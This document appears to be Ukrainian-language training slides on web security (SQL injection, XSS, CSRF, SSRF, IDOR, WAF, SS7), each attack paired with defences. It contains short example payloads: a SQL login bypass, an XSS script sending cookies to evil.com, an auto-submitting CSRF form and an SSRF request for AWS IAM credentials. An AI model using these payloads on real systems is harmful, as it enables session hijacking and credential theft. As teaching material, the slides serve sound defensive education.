Injection-атаки (A03)

SQL Injection — найпоширеніший вид

-- Вхід: username = ' OR '1'='1
-- Вхід: password = anything

SELECT * FROM users
  WHERE name='' OR '1'='1'
  AND pass='...';
-- Повертає ВСІХ → обхід автентифікації!

Захист

  • Parameterized queries (єдино правильний спосіб)
  • ORM (але уважно з raw queries!)
  • Валідація та whitelist вхідних даних
  • Принцип найменших привілеїв для DB-облікового запису

Вразливості автентифікації (A07)

Типові помилки

  • Слабкі паролі без обмежень складності
  • Відсутність MFA / 2FA для критичних функцій
  • Незахищені механізми відновлення паролю
  • Витік облікових даних через URL, логи
  • Відсутність блокування після N невдалих спроб

Кращі практики

  • OAuth 2.0 + OIDC для делегованої авторизації
  • PKCE для публічних клієнтів (SPA, Mobile)
  • Refresh tokens з ротацією замість довгих access tokens

XSS — Cross-Site Scripting

Три типи XSS

Reflected XSS: скрипт у відповіді на запит (URL-параметр)

https://shop.example/search?q=
<script>document.location=
'evil.com/steal?c='+document.cookie
</script>

Stored XSS: зловмисний скрипт збережено у БД (коментарі, профіль)

DOM-based XSS: маніпуляція DOM на стороні клієнта

Наслідки

  • Крадіжка cookie / session tokens
  • Keylogging — перехоплення введення паролів
  • Перенаправлення на фішингові сайти

Захист

РівеньМеханізм
Вихідне кодуванняhtmlspecialchars(), encodeURIComponent()
CSPContent-Security-Policy: default-src 'self'
Cookie атрибутиHttpOnly; Secure; SameSite=Strict
БібліотекиDOMPurify, OWASP Java Encoder
CSP заголовок:
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.example;

CSRF — Cross-Site Request Forgery

Механізм атаки

Атакуючий змушує авторизованого користувача ненавмисно надіслати запит:

<!-- На сайті зловмисника: -->
<img src="https://bank.example/transfer
  ?to=attacker&amount=5000">

<!-- Або прихована форма: -->
<form action="https://bank.example/transfer"
      method="POST" id="f">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="5000">
</form>
<script>document.getElementById('f').submit()</script>

Захист від CSRF

  • CSRF-токени — синхронізований токен у формі
  • SameSite Cookie (SameSite=Strict або Lax)
  • Double Submit Cookie pattern
  • Перевірка заголовків Origin / Referer
SameSite=Strict — браузер не надсилає cookie
для cross-site запитів взагалі.
SameSite=Lax — лише для безпечних GET-методів.

SSRF — Server-Side Request Forgery (A10)

Механізм атаки

Сервер виконує запити за адресою, вказаною зловмисником:

POST /api/fetch-url HTTP/1.1
{
  "url": "http://169.254.169.254/latest/
          meta-data/iam/security-credentials/
          EC2-prod-role"
}

-- Відповідь:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "..."
}

→ Зловмисник отримує IAM credentials!

Цілі SSRF

  • AWS IMDS → крадіжка IAM credentials
  • Внутрішні мікросервіси (Redis, Elasticsearch)
  • Cloud metadata endpoints
  • Файли локальної ФС (file:///etc/passwd)

Захист

  • Whitelist дозволених доменів/IP
  • Блокування приватних IP-діапазонів
  • IMDSv2 — токен-авторизований metadata
  • Мережева сегментація

IDOR та Broken Access Control (A01)

IDOR — Insecure Direct Object Reference

GET /api/invoices/1042 → 200 OK (мій рахунок)
GET /api/invoices/1043 → 200 OK (чужий!) ← IDOR

-- Виправлення:
if invoice.user_id != current_user.id:
    return 403 Forbidden

Характеристики:

  • Передбачувані ідентифікатори (числа, UUID)
  • Відсутність перевірки власника ресурсу
  • Горизонтальне / вертикальне підвищення привілеїв

Типові помилки Broken Access Control

ПомилкаНаслідок
IDOR по ID в URLЧитання/зміна чужих даних
Обхід через заголовкиX-Forwarded-For: 127.0.0.1
Доступ до адмін без роліПривілейоване виконання
Приховані URLDirectory traversal

Захист

  • Перевірка авторизації кожного запиту на сервері
  • UUID замість числових ID
  • ABAC (Attribute-Based Access Control)
  • Тести на авторизацію в CI/CD

WAF — Web Application Firewall

Що захищає WAF?

Клієнт → [WAF] → Load Balancer
                   ↓
             Web Application
                   ↓
               Database

WAF аналізує HTTP/HTTPS трафік
та блокує шкідливі запити

Режими:

  • Detection mode — журналює без блокування
  • Prevention mode — активно блокує
⚠️ WAF не замінює правильне кодування!
False positives — потребує тонкого налаштування.
Не захищає від логічних вразливостей і IDOR.

SS7 — Вразливості протоколу сигналізації

Що таке SS7?

SS7 (Signaling System No. 7) — набір протоколів 1975 року для налаштування телефонних дзвінків у мережах PSTN/GSM.

Ключові підпротоколи: MAP, ISUP, TCAP, SCCP

Захист

  • SS7 Firewall — фільтрація аномальних MAP-повідомлень
  • GSMA FS.11 — стандарт захисту з'єднань
  • Моніторинг — підозрілі SRI/ATI запити
  • Перехід на Diameter та 5G SBA
